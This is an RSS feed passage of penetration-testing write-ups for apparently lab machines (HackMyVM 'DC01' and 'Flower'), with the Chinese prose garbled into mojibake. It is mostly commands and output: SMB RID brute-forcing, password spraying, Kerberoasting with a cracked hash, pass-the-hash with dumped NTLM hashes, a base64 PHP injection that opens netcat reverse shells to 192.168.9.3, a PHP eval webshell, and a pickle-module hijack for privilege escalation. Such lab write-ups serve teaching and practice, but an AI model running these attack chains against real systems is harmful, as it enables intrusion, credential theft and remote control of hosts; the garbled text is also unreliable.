<br>å…ˆæŠŠåŸŸåé…ç½®è¿›/etc/hosts<br>192.168.56.128 SOUPEDECODE.LOCAL DC01.SOUPEDECODE.LOCAL
<br><br>ä½œè€…å¼€æ”¾äº†139 445ç«¯å£ï¼Œå¾ˆæ˜æ˜¾çš„SMBç‰¹å¾<br>åˆ©ç”¨smbmap æšä¸¾SMBæœåŠ¡ æ£€æµ‹æ˜¯å¦å­˜åœ¨åŒ¿åç™»å½•æˆ–è€…æ¥å®¾ç™»å½•<br>smbmap -u anonymous -H SOUPEDECODE.LOCAL

    \_\_\_\_\_\_\_\_  \_\_\_      \_\_\_  \_\_\_\_\_\_\_   \_\_\_      \_\_\_       \_\_         \_\_\_\_\_\_\_
   /"       )|"  \    /"  ||   \_  "\ |"  \    /"  |     /""\       |   \_\_ "\
  (:   \\_\_\_/  \   \  //   |(. |\_)  :) \   \  //   |    /    \      (. |\_\_) :)
   \\_\_\_  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  \_\_\_\_/
    \_\_/  \   |: \.        |(|  \_  \  |: \.        |  //  \_\_'  \    (|  /
   /" \   :) |.  \    /:  ||: |\_)  :)|.  \    /:  | /   /  \   \  /|\_\_/ \
  (\_\_\_\_\_\_\_/  |\_\_\_|\\_\_/|\_\_\_|(\_\_\_\_\_\_\_/ |\_\_\_|\\_\_/|\_\_\_|(\_\_\_/    \\_\_\_)(\_\_\_\_\_\_\_)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\*] Detected 1 hosts serving SMB
[\*] Established 1 SMB session(s)
                                                                                              
[+] IP: 192.168.56.128:445      Name: soupedcode.loacl          Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        backup                                                  NO ACCESS
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share
        SYSVOL                                                  NO ACCESS       Logon server share
        Users                                                   NO ACCESS
<br>å‘ç° IPC$  æ˜¯å¯ä»¥è¯»å–çš„<br>å‘ç°æ˜¯å¯ä»¥åŒ¿åç™»å½•çš„ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªç”¨æˆ· è¿›è¡Œç›¸å¯¹æ ‡è¯†ç¬¦ï¼ˆRIDï¼‰æš´åŠ›æšä¸¾å‡ºåŸŸå†…çš„å…¶ä»–ç”¨æˆ·<br>crackmapexec smb SOUPEDECODE.LOCAL -u 'anonymous' -p '' --rid-brute &gt; rid_bruteforce.txt

cat rid\_bruteforce.txt | grep SidTypeUser | cut -d '\' -f2 | cut -d ' ' -f1 &gt; valid\_users.txt
<br>é€šè¿‡ridæšä¸¾ è·å–äº†1000å¤šä¸ªç”¨æˆ·å<br>ASREPRoasting æ”»å‡»<br>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™äº›ç”¨æˆ·è¿›è¡ŒASREPRoasting æ”»å‡»ï¼Œä½†æ˜¯éƒ½å¤±è´¥äº†ã€‚å› ä¸ºæ‰€æœ‰è¿™äº›å¸æˆ·éƒ½è®¾ç½®äº† Kerberos é¢„èº«ä»½éªŒè¯æ‰€éœ€çš„å±æ€§<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/DC01]
â””â”€# crackmapexec smb SOUPEDECODE.LOCAL -u valid\_users.txt -p valid\_users.txt  --no-bruteforce
SMB         SOUPEDECODE.LOCAL 445    DC01             [\*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\Administrator:Administrator STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\Guest:Guest STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\krbtgt:krbtgt STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\DC01$:DC01$ STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\bmark0:bmark0 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\otara1:otara1 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\kleo2:kleo2 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\eyara3:eyara3 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\pquinn4:pquinn4 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\jharper5:jharper5 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\bxenia6:bxenia6 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\gmona7:gmona7 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\oaaron8:oaaron8 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\pleo9:pleo9 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\evictor10:evictor10 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\wreed11:wreed11 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\bgavin12:bgavin12 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\ndelia13:ndelia13 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\akevin14:akevin14 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\kxenia15:kxenia15 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\ycody16:ycody16 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\qnora17:qnora17 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\dyvonne18:dyvonne18 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\qxenia19:qxenia19 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\rreed20:rreed20 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\icody21:icody21 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\ftom22:ftom22 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\ijake23:ijake23 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\rpenny24:rpenny24 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\jiris25:jiris25 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\colivia26:colivia26 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\pyvonne27:pyvonne27 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\zfrank28:zfrank28 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317
<br>æˆåŠŸè·å–åˆ°äº†ä¸€å¯¹ç”¨æˆ·å¯†ç <br>ybob317:ybob317
<br>æšä¸¾ Kerberos æœåŠ¡ä¸»ä½“åç§°ï¼ˆSPNsï¼‰<br>åˆ©ç”¨impacket-GetUserSPNs æšä¸¾ç”¨æˆ·çš„æœåŠ¡å¸æˆ·ä¿¡æ¯ï¼Œç„¶åä½¿ç”¨è¿™äº› SPN è·å– Kerberos æœåŠ¡ç¥¨è¯ï¼ˆTGTï¼‰ï¼Œå€ŸåŠ©TGTæˆ‘ä»¬å¯ä»¥å‘TGSè¯·æ±‚è·å–TGS å¹¶è®¿é—®å¯¹åº”çš„æœåŠ¡<br>åœ¨æšä¸¾è¿™äº›è´¦æˆ·ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å…ˆå°†æ”»å‡»æœºçš„æ—¶é—´ä¸åŸŸæ§çš„æ—¶é—´åŒæ­¥ï¼Œä¸ç„¶ä¼šè¿æ¥å¤±è´¥<br>timedatectl set-ntp off
rdate -n  192.168.56.128
impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317 -dc-ip 192.168.56.128 -usersfile valid\_users.txt -request -outputfile spn-users.tgs
<br><img alt="20.DC01.001" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/20.DC01.001.png" referrerpolicy="no-referrer"><br><br>è·å–åˆ°äº†ç›®æ ‡ä¸ŠæœåŠ¡è´¦æˆ·çš„TGSåå¯ä»¥åˆ©ç”¨hashcatè¿›è¡Œçˆ†ç ´<br>hashcat -a 0 -m 13100 spn-users.tgs /usr/share/wordlists/rockyou.txt  

$krb5tgs$23$\*file\_svc$SOUPEDECODE.LOCAL$file\_svc\*$819b74fc74d654f64b4ffc                           d59fcaffa8$1b2935d454f2797b08b5e5e3b1c9e093b5982e38edfb66c99f2264bcfa472                           84eaccdebc1bd926bde0a24db8ff34869da0d52fdfcaca2fea7e6c3b5476b5c4e231c842                           616b12bf97e643c060983421dd1cf6f358f0569f4214516f0eec01111e543b0035a5dc28                           332619c22e939a86e5a08fa586f06aa8e2c3c553d79057cfde0f60e99a072ee8edbee941                           2043b665fb117284513fb9c78b212af0d8447c6f96ff2cd75e921fda971125a358ac5029                           35ad8f451ef5a441514b331e41196310c20235f38849402bb94d4d7e505d249a3d961a1d                           fecb3e11f7fc395ec3a4d49fb67d44a0c56b46a8bbea697b766bc493b1de8c79428efae7                           1ef27b1ac43ebc85be78d2829dcd0700b09333bfe841a458c90fbba29bd2d997e7b8a5c6                           174104985675bd8e6b78241ee114b15f5e57b66e35467aa89d827cae400c0cf7618acae7                           909eaf536dc1e5cceadb028c5113e269d4de9c75703cc3e8c71883a981a233d7564715b2                           7982284f3943da002846358961d7fb54de55b90ab02f41f0a357a083721601fc7a655815                           a8cc6d20024639be7e610b7fe65969c06ea6efa388e203821c3480605be47e37c44226fc                           dabcec441cf0bfca7e7d99ffdc5ca0a28b8d0c6dd99fa55209dbec51eebd49faeebb1d80                           1efda2c78f966e63767c541cee0d017581770e9780d0316e0173382e6774f95e00b3dda7                           d0eb05f7766b1f76726eb26395561cd9c2d55af8057cc35bfb7b2468006d80ab8c2b68ef                           0281659e598f117bf0d2a57179d4e203256374e1dbb20dfaafd40316c508fc88ac2ccb53                           658ec19d6439f5a2956fc76e24ad09b4ecd452022758f79a0a0878c60e21ceb0059a22dc                           f5965012e9e9a0dab3222180880e0f5da3c0aaddb76587a7452ce2a37b21d7f68d097ef7                           8b25fab43f43d60c59c2b48c9c8542e9c05099ff1a59c66c66731915e3ceddb579ee2dca                           663270904eec929004bb6b9081a37ceb9d6848fed0ce388721ceafe05175a8564b262c04                           3244f90d01d9a51c3291fe4f16091b80ddf883e14e4f2531afb77d25a41f18cbb2b30de0                           f9ecd778821ecb2526041398178b3b58ac0057d0ebba808d6845a4353fdbcd012d9a0887                           4f7e4c24c1ad40cf2c65b053bc056a1479fbc1cb84140c34ec1ead95dd5555794c3c1c66                           57b2b8f5c4f47b2fbd0889dac1ae71dc8f8abdd1ac9ae13d9e2b1192d191811bb6a38f31                           62ea4baf2322b1b38cd6bbf6662c6920a2c71d6e72ac0686cd2aecc7f9f54b499b194f7f                           6ee8ca01f792ff0a784641ea5efed8c0940314efc87fbcdb997e311cc48e95f766d2c6a3                           25ece96089d7ca723195f9ff8812cb807d039d4345ba7def5903ed5d19f995f1720fe3e6                           a3709d01977f086f0fe351e9a767d5ccbc2e9b92bb29715ab0edc32cb800decdbcdf9977                           e3558992782afdd7e56b65e703e1360117af01e8c96149ad27525f9b45b62b0b4a6ea407                           c0a4162789879307cfd7e6cd62ccf01e8ff73:Password123!!
<br>æˆåŠŸè·å–åˆ°äº†file_svcç”¨æˆ·çš„å¯†ç <br>file\_svcï¼šPassword123!!
<br>çœ‹è¿™ä¸ªåå­—å°±çŸ¥é“ä¸æ–‡ä»¶æœåŠ¡ç›¸å…³<br><br>crackmapexec smb SOUPEDECODE.LOCAL -u file\_svc -p 'Password123!!' --shares
<br><img alt="20.DC01.002" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/20.DC01.002.png" referrerpolicy="no-referrer"><br>å¯ä»¥å‘ç°é‡Œé¢æœ‰ä¸€ä¸ªbackup å…±äº«<br><br>smbclient -U 'filesvc' //SOUPEDECODE.LOCAL/backup
Password for [WORKGROUP\file\_svc]:
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Tue Jun 18 01:41:17 2024
  ..                                 DR        0  Tue Jun 18 01:44:56 2024
  backup\_extract.txt                  A      892  Mon Jun 17 16:41:05 2024

                12942591 blocks of size 4096. 10958701 blocks available
smb: \&gt; ls -la
NT\_STATUS\_NO\_SUCH\_FILE listing \-la
smb: \&gt; dir -a
NT\_STATUS\_NO\_SUCH\_FILE listing \-a
smb: \&gt; ls -a
NT\_STATUS\_NO\_SUCH\_FILE listing \-a
smb: \&gt; ls
  .                                   D        0  Tue Jun 18 01:41:17 2024
  ..                                 DR        0  Tue Jun 18 01:44:56 2024
  backup\_extract.txt                  A      892  Mon Jun 17 16:41:05 2024

                12942591 blocks of size 4096. 10958701 blocks available
smb: \&gt; get backup\_extract.txt
getting file \backup\_extract.txt of size 892 as backup\_extract.txt (58.1 KiloBytes/sec) (average 58.1 KiloBytes/sec)
smb: \&gt; exit
<br>cat backup\_extract.txt
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
<br>è·å–åˆ°äº†ä¸€äº›ç›®æ ‡æœåŠ¡è´¦æˆ·çš„NTLM å¯†ç å“ˆå¸Œå€¼ï¼Œåˆ©ç”¨è¿™äº›hashæ­é…å‰é¢çš„ç”¨æˆ·åå•è¿›è¡Œæšä¸¾ï¼Œæ£€æŸ¥æ˜¯å¦å‡ºç°ä»»ä½•é‡å¤ä½¿ç”¨çš„å¯†ç <br>Warning
åœ¨å®é™…æ¸—é€æµ‹è¯•ä¸­ï¼Œæ ¹æ®ç¯å¢ƒä¸­çš„å¸æˆ·é”å®šç­–ç•¥é™åˆ¶å¯†ç å–·å°„å°è¯•çš„æ¬¡æ•°è‡³å…³é‡è¦ã€‚è¿™ç§é¢„é˜²æªæ–½æœ‰åŠ©äºé˜²æ­¢æ•æ„Ÿè´¦æˆ·è¢«æ„å¤–é”å®šï¼Œè¿™å¯èƒ½ä¼šå¹²æ‰°æˆ‘ä»¬å®¢æˆ·çš„è¿è¥ã€‚
<br>cat backup\_extract.txt | cut -d 'ï¿¥' -f1 &gt; names.txt
cat backup\_extract.txt | cut -d ':' -f4 &gt; hashes.txt
crackmapexec smb SOUPEDECODE.LOCAL -u valid\_users.txt  -H hashes.txt | grep -v '[-]'

<br><img alt="20.DC01.003" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/20.DC01.003.png" referrerpolicy="no-referrer"><br>æˆåŠŸæšä¸¾å‡ºFileServer$ ç”¨æˆ·ï¼Œè¿™è¡¨ç¤ºæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªç”¨æˆ·è¿æ¥åˆ°DC01ï¼Œå› ä¸ºDCå¯¹è¿™ä¸ªç”¨æˆ·æ‰˜ç®¡äº†å…±äº«çš„æƒé™ï¼Œæ‰€ä»¥è¯´è‚¯å®šæ˜¯å¯ä»¥è¿æ¥DC01çš„<br><br>evil-winrm -i 192.168.56.128 -u "FileServer$" -H e41da7e79a4c76dbd9cf79d1cb325559
<br><img alt="20.DC01.004" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/20.DC01.004.png" referrerpolicy="no-referrer"><br>è·å–fileserver$ ç”¨æˆ·åœ¨åŸŸæ§ä¸»æœºä¸Šçš„æƒé™ã€‚<br> whoami /all
 USER INFORMATION
----------------

User Name               SID
======================= ============================================
soupedecode\fileserver$ S-1-5-21-2986980474-46765180-2505414164-2065


GROUP INFORMATION
-----------------

Group Name                                         Type             SID                                         Attributes
================================================== ================ =========================================== ===============================================================
SOUPEDECODE\Domain Computers                       Group            S-1-5-21-2986980474-46765180-2505414164-515 Mandatory group, Enabled by default, Enabled group
Everyone                                           Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access         Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                      Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                             Alias            S-1-5-32-544                                Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                               Well-known group S-1-5-2                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                   Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                     Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group
SOUPEDECODE\Enterprise Admins                      Group            S-1-5-21-2986980474-46765180-2505414164-519 Mandatory group, Enabled by default, Enabled group
SOUPEDECODE\Denied RODC Password Replication Group Alias            S-1-5-21-2986980474-46765180-2505414164-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication                   Well-known group S-1-5-64-10                                 Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level               Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled


USER CLAIMS INFORMATION
-----------------------
<br>å¯ä»¥å‘ç°è¯¥ç”¨æ˜¯Administratorsç»„çš„ç”¨æˆ·<br>é‚£ä¹ˆæˆ‘ä»¬å°±ä¸éœ€è¦ææƒäº†<br>ç›´æ¥è¯»flag<br>\*Evil-WinRM\* PS C:\Users\FileServer$\Documents&gt; type C:\Users\ybob317\Desktop\user.txt
6bab1f09a7403980bfeb4c2b412be47b
\*Evil-WinRM\* PS C:\Users\FileServer$\Documents&gt; type C:\Users\administrator\desktop\root.txt
a9564ebc3289b7a14551baf8ad5ec60a
]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/20.dc01.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/20.DC01.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/20.DC01.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/20.DC01.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[2.Flower]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. webshell" data-href="#2. webshell" href="https://www.c1trus.top/about:blank#2._webshell" class="internal-link" target="_self" rel="noopener nofollow">2. webshell</a>
<br><a data-tooltip-position="top" aria-label="3. å†™åé—¨" data-href="#3. å†™åé—¨" href="https://www.c1trus.top/about:blank#3._å†™åé—¨" class="internal-link" target="_self" rel="noopener nofollow">3. å†™åé—¨</a>
<br><a data-tooltip-position="top" aria-label="4. ææƒ" data-href="#4. ææƒ" href="https://www.c1trus.top/about:blank#4._ææƒ" class="internal-link" target="_self" rel="noopener nofollow">4. ææƒ</a>
<br><br>nmap æ‰«æç«¯å£<br>Nmap scan report for 192.168.9.4
Host is up (0.00014s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:18:4F:12 (Oracle VirtualBox virtual NIC)
<br>è®¿é—®ç½‘ç«™æŸ¥çœ‹<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/2.Flower.001.png" referrerpolicy="no-referrer"><br>ç‚¹å‡»submit<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/2.Flower.002.png" referrerpolicy="no-referrer"><br>é€‰æ‹©ä¸åŒçš„èŠ±ä¼šæ˜¾ç¤ºå‡ºä¸åŒçš„æ•°å­—<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/2.Flower.003.png" referrerpolicy="no-referrer"><br>æ—¢ç„¶è¿™ä¸ªæ•°å­—åœ¨å˜ï¼Œé‚£æˆ‘åº”è¯¥ä»æ•°å­—å…¥æ‰‹ã€‚æŠ“ä¸ªåŒ…çœ‹çœ‹<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/2.Flower.004.png" referrerpolicy="no-referrer"><br>è¿™ä¸ªMSsyå°±æ˜¯1+2=3<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/2.Flower.004.png" referrerpolicy="no-referrer"><br>è¯´æ˜è¿™é‡Œå­˜åœ¨Base64åçš„ä»£ç è§£æ<br>å…ˆæµ‹è¯•ä¸‹<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/2.Flower.004.png" referrerpolicy="no-referrer"><br>ç›´æ¥åå¼¹shell<br>c3lzdGVtKCdiYXNoIHwgbmMgMTkyLjE2OC45LjMgMTEyMicp
#system('bash | nc 192.168.9.3 1122')
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/2.Flower.004.png" referrerpolicy="no-referrer"><br>å¼¹shellæˆåŠŸåä½†æ˜¯ä¸ç»™å›æ˜¾ <br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/2.Flower.005.png" referrerpolicy="no-referrer"><br>ç›´æ¥å†™æ–‡ä»¶<br>å…ˆçœ‹ä¸€ä¸‹å½“å‰ç›®å½•<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/2.Flower.006.png" referrerpolicy="no-referrer"><br>å°±åœ¨ç½‘ç«™ç›®å½•<br><br>system('echo "&lt;?php eval(\$\_POST[\"pass\"]);?&gt;" &gt; a.php');
c3lzdGVtKCdlY2hvICI8P3BocCBldmFsKFwkX1BPU1RbXCJwYXNzXCJdKTs/PiIgPiBhLnBocCcpOw==
<br>å“¥æ–¯æ‹‰è¿æ¥<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/2.Flower.007.png" referrerpolicy="no-referrer"><br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/2.Flower.008.png" referrerpolicy="no-referrer"><br><br>find / -perm -4000 2&gt;/dev/null
<br>å°è¯•SUID ææƒå‘ç°æ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/2.Flower.009.png" referrerpolicy="no-referrer"><br>è¿™é‡Œé¢å¯ä»¥çœ‹åˆ°æœ‰sudo<br>æˆ‘ä»¬çœ‹ä¸‹å½“å‰ç”¨æˆ·å¯ä»¥ç”¨sudoæ‰§è¡Œä»€ä¹ˆæ–‡ä»¶<br>/tmp &gt;sudo -l

Matching Defaults entries for www-data on flower:
    env\_reset, mail\_badpass, secure\_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on flower:
    (rose) NOPASSWD: /usr/bin/python3 /home/rose/diary/diary.py
<br>çœ‹ä¸‹è¿™ä¸ªæ–‡ä»¶<br>import pickle

diary = {"November28":"i found a blue viola","December1":"i lost my blue viola"}
p = open('diary.pickle','wb')
pickle.dump(diary,p)
<br>åˆ†æè„šæœ¬å¯ä»¥å‘ç°è¿™ä¸ªè„šæœ¬ä¼šå¼•å…¥pickleæ¨¡å—ï¼Œç„¶åæ‰§è¡Œä»£ç <br>è¿™é‡Œæˆ‘ä»¬åœ¨åŒçº§ç›®å½•æ–°å»ºä¸€ä¸ªpickle.pyæ–‡ä»¶ã€‚è¿™æ ·å°±ä¼šå¼•å…¥æˆ‘ä»¬çš„è¿™ä¸ªpickle.py è€Œä¸ä¼šå¼•å…¥æ¨¡å—åº“é‡Œé¢çš„pickle<br>æ–°å»ºä¸€ä¸ªpickle.pyæ–‡ä»¶<br>å°†åå¼¹å‘½ä»¤å†™è¿›è¿™ä¸ªæ–‡ä»¶é‡Œé¢ <br>import os;os.system("/bin/bash")
<br>ç„¶åæ‰§è¡Œdiary.py<br>sudo -u rose /usr/bin/python3 /home/rose/diary/diary.py
<br>sudo -u rose /usr/bin/python3 /home/rose/diary/diary.py<br>system('nc -e /bin/sh 192.168.9.3 9999')
]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/2.flower.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/2.Flower.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/2.Flower.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/2.Flower.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[18.Light]]></title><description><![CDATA[ 
 <br><br>
